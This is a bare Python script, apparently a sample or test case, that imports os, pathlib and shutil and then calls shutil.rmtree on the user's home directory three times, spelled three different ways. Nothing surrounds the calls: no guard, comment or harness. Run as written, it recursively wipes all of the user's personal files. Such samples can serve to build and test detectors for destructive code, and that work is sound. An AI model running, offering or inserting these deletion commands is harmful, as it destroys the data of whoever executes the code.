import os
import pathlib
import shutil
from pathlib import Path

shutil.rmtree(os.path.expanduser("~"))
shutil.rmtree(Path.home())
shutil.rmtree(pathlib.Path.home())
